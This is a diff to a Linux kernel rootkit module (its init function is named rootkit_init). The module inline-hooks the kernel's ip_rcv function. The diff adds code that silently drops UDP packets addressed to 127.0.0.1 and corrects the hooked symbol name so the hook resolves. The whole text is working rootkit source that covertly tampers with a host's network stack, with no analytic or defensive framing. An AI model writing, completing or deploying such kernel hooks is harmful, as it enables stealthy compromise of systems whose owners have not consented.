@@ -6,26 +6,34 @@
 #include "hfiles/inlHook.h"
 #include "hfiles/typedefs.h"
 
-
+unsigned long addr;
 int (*fp_ip_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
 	   struct net_device *orig_dev); 
 
-unsigned long addr;
-int my_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev)
-{
-    inline_unhook_x64(); 
-    
-    printk(KERN_INFO "hooked"); 
-    
-    fp_ip_rcv(skb, dev, pt, orig_dev); 
 
+int my_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev)
+{ 
+    struct iphdr* ip_header =  (struct iphdr*)skb_network_header(skb); 
+    unsigned char *deny_ip = "\x7f\x00\x00\x01"; // 127.0.0.1 
+    
+    if(ip_header->protocol == 17) 
+    { 
+        if(ip_header->daddr == *(unsigned int*)deny_ip){
+            printk(KERN_INFO "dropping  packet..."); 
+            return NET_RX_DROP; 
+        } 
+    } 
+   
+    inline_unhook_x64(); 
+    fp_ip_rcv(skb, dev, pt, orig_dev);
     inline_hook_x64(fp_ip_rcv, my_ip_rcv); 
-    return 1; 
+
+    return NET_RX_SUCCESS; 
 }
 
 static int __init rootkit_init(void) {
 
-    addr = dumpAddr("ip_recv"); 
+    addr = dumpAddr("ip_rcv"); 
     fp_ip_rcv = (unsigned long)addr; 
 
     inline_hook_x64(fp_ip_rcv, my_ip_rcv); 
